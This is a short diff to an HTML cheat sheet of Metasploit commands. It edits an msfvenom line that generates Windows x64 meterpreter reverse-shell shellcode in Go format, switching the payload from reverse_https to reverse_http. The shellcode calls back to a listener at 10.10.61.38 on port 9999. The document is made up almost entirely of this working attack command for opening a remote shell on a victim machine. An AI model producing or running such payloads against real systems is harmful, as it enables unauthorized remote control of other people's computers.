@@ -6,7 +6,7 @@
 <h2>Metasploit commands:</h2>
 <h3>Shellcode generation:</h3>
 <ul>
-<li>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.61.38 LPORT=9999 -f go</li>
+<li>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.61.38 LPORT=9999 -f go</li>
 </ul>
 
 <h3>Listener:</h3>
